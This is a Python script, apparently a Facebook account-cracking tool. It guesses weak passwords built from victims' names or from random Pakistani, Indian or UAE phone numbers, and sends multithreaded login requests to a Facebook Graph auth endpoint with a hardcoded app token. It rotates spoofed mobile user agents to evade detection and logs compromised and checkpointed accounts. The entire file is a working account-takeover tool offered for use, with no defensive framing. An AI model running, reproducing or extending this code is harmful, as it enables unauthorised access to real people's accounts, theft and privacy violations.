# -*- coding: utf-8 -*-
import os, requests, json, time, re, random, sys, uuid, string, subprocess, base64, hashlib
from concurrent.futures import ThreadPoolExecutor as tred

#--> Colors
H = "\x1b[38;5;46m"  # Green
M = "\x1b[38;5;196m" # Red
P = "\x1b[38;5;231m" # White
K = "\x1b[38;5;226m" # Yellow

loop, oks, cps = 0, [], []

# --- 30+ DYNAMIC USER-AGENT GENERATOR ---
def get_jerry_ua():
    # Android Models List
    android_models = [
        ("SM-A105F", "Samsung", "9"), ("Redmi-Note7", "Redmi", "9"), ("CPH1937", "Oppo", "9"),
        ("Vivo-1904", "Vivo", "9"), ("Infinix-X650B", "Infinix", "9"), ("SM-A217F", "Samsung", "10"),
        ("M2003J15SC", "Redmi", "10"), ("RMX2020", "Realme", "10"), ("Vivo-1917", "Vivo", "10"),
        ("TECNO-KD6", "Tecno", "10"), ("Xiaomi Redmi 14C", "Redmi", "14"), ("Redmi 12", "Redmi", "12"),
        ("RMX3231", "Realme", "11"), ("Vivo-2109", "Vivo", "11"), ("Infinix-X688B", "Infinix", "11"),
        ("SM-A136B", "Samsung", "12"), ("SM-M336B", "Samsung", "13"), ("SM-A356E", "Samsung", "14"),
        ("SM-S938B", "Samsung", "15"), ("2209116AG", "Redmi", "13"), ("RMX3850", "Realme", "13"),
        ("V2404", "Vivo", "14"), ("Infinix-X6870", "Infinix", "13"), ("TECNO-AD8", "Tecno", "13"),
        ("XT2313-3", "Motorola", "14"), ("CPH2573", "Oppo", "14"), ("XQ-CT54", "Sony", "14"),
    ]
    # iPhone Models List
    iphone_models = [
        ("iPhone12,5", "13.7"), ("iPhone13,4", "14.8"), ("iPhone14,5", "15.4"),
        ("iPhone15,3", "16.0"), ("iPhone16,2", "17.0"), ("iPhone17,2", "18.0"),
        ("iPhone11,8", "12.4"), ("iPhone14,2", "15.0"), ("iPhone15,2", "16.5"),
    ]
    # Network & App Variants
    fban_types = ["FB4A", "FBIOS", "FBAN/Messenger", "FBAN/FB4Lite", "FBAN/Orca", "FBAN/Katana", "FBAN/AdsManager"]
    networks = ['Jazz', 'Zong', 'Telenor', 'Ufone', 'Airtel', 'Jio', 'MTN', 'Etisalat', 'Vodafone']
    
    selector = random.randint(1, 30) # 30 different variations
    
    if selector <= 20: # Generate Android UA
        model, brand, ver = random.choice(android_models)
        chrome = f"{random.randint(110,128)}.0.{random.randint(5000,6900)}.{random.randint(10,150)}"
        fbav = f"{random.randint(400,550)}.0.0.{random.randint(10,60)}.{random.randint(100,200)}"
        fban = random.choice(fban_types)
        
        # Multiple Formats
        formats = [
            f"Mozilla/5.0 (Linux; Android {ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 [FBAN/{fban};FBAV/{fbav};FBDV/{model};FBMF/{brand};FBBD/{brand};FBSV/{ver};FBOP/1;FBCR/{random.choice(networks)}]",
            f"Dalvik/2.1.0 (Linux; U; Android {ver}; {model} Build/QP1A.{random.randint(100000,999999)}.001) [FBAN/{fban};FBAV/{fbav};FBDV/{model};FBMF/{brand};FBBD/{brand};FBSV/{ver};FBOP/1;FBCR/{random.choice(networks)}]",
            f"Mozilla/5.0 (Linux; Android {ver}; {model} Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36 [FBAN/{fban};FBAV/{fbav};FBDV/{model};FBMF/{brand};FBBD/{brand};FBSV/{ver};FBOP/5;FBCR/{random.choice(networks)}]"
        ]
        return random.choice(formats)
        
    else: # Generate iPhone UA
        model, ios_ver = random.choice(iphone_models)
        fbav = f"{random.randint(400,550)}.0.0.{random.randint(10,60)}"
        build = f"{random.randint(15,19)}{random.choice(string.ascii_uppercase)}{random.randint(100,999)}"
        fban = random.choice(fban_types)
        
        formats = [
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver.replace('.', '_')} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/{build} [FBAN/{fban};FBAV/{fbav};FBDV/{model};FBSN/iOS;FBSV/{ios_ver};FBSS/{random.randint(1,3)};FBOP/1;FBCR/{random.choice(networks)}]",
            f"Mozilla/5.0 (iPad; CPU OS {ios_ver.replace('.', '_')} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_ver} Mobile/{build} [FBAN/{fban};FBAV/{fbav};FBDV/{model};FBSN/iOS;FBSV/{ios_ver};FBSS/2;FBOP/1;FBCR/]"
        ]
        return random.choice(formats)

# --- BRANDING ---
def clear():
    os.system('clear')
    print(f"""{H}
      ╱╱╭┳━━━┳━━━┳━━━┳╮╱╱╭╮
      ╱╱┃┃╭━━┫╭━╮┃╭━╮┃╰╮╭╯┃
      ╱╱┃┃╰━━┫╰━╯┃╰━╯┣╮╰╯╭╯
      ╭╮┃┃╭━━┫╭╮╭┫╭╮╭╯╰╮╭╯
      ┃╰╯┃╰━━┫┃┃╰┫┃┃╰╮╱┃┃
      ╰━━┻━━━┻╯╰━┻╯╰━╯╱╰╯
{P}--------------------------------------------------
{H} AUTHOR    {P}: Jerry Brand 🔥😈
{H} NETWORKS  {P}: JAZZ, ZONG, TELENOR, UFONE
{H} UA STATUS {P}: 30+ DYNAMIC FORMATS ACTIVE
{P}--------------------------------------------------""")

# --- FILE CRACKING LOGIC ---
def file_crack():
    clear()
    path = input(f' {K}Put File Path{P}: ')
    try: fo = open(path,'r').read().splitlines()
    except: menu()
    clear()
    print(f" {H}Cracking Started | Total IDs: {len(fo)}")
    with tred(max_workers=35) as engine:
        for user in fo:
            uid, name = user.split('|')
            first = name.split(' ')[0].lower()
            last = name.split(' ')[1].lower() if len(name.split(' ')) > 1 else ''
            
            # YOUR SPECIFIC PASSWORD LIST
            plist = [
                f"{first} {last}", f"{first}{last}", f"{first}123", 
                f"{first}12345", f"{name}", f"{first}786", 
                f"{first}{last}123", f"{first}{last}786"
            ]
            engine.submit(crack_engine, uid, plist)
    menu()

# --- RANDOM CRACKING ---
def random_menu():
    clear()
    print(" [1] Pakistan | [2] India | [3] UAE")
    c = input('\n Choice: ')
    code = {'1':'923', '2':'91', '3':'971'}.get(c, '923')
    limit = int(input(' Limit: '))
    with tred(max_workers=35) as engine:
        for _ in range(limit):
            ids = code + ''.join(random.choice(string.digits) for _ in range(8))
            plist = [ids, ids[2:], 'pakistan', '786786', 'khan123']
            engine.submit(crack_engine, ids, plist)
    menu()

# --- CORE ENGINE ---
def crack_engine(uid, plist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r{P} [JERRY] {loop}|{H}OK:-{len(oks)}'); sys.stdout.flush()
    try:
        for pas in plist:
            ua = get_jerry_ua()
            session = requests.Session()
            # Professional Headers & API
            token = "350685531728|62f8ce9f74b12f84c123cc23462a4a61"
            data = {
                "access_token": token, "sdk_version": "31",
                "email": uid, "password": pas, "sdk": "android",
                "generate_session_cookies": "1", "sig": hashlib.md5(os.urandom(16)).hexdigest()
            }
            headers = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers).json()
            
            if 'session_key' in res:
                print(f'\r\r{H} [OK] {uid} | {pas}')
                oks.append(uid); break
            elif 'www.facebook.com' in str(res):
                print(f'\r\r{K} [CP] {uid} | {pas}')
                cps.append(uid); break
        loop += 1
    except: pass

def menu():
    clear()
    print(" [1] File Crack | [2] Random Crack | [0] Exit")
    x = input('\n Choice: ')
    if x == '1': file_crack()
    elif x == '2': random_menu()
    else: exit()

if __name__ == '__main__': menu()
